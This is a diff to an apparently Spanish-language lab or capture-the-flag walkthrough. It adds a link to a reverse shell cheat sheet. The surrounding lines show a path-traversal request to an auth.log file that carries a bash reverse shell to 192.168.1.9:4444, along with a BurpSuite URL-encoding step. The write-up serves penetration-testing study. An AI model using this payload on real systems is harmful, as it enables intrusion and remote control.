@@ -105,6 +105,8 @@ BurpSuite capturará la solicitud GET y a la misma se le agregará comandos extr
 ```
 http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log&cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.9/4444 0>&1'
 ```
+Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
 ![13](https://user-images.githubusercontent.com/75953873/175164908-c3716f51-9f43-4ad5-8f65-7b411f54495e.png)
 
 Antes de obtener un reverse shell, es preciso codificar los comandos extras. Convert selection **>** URL **>** URL-encode all characters
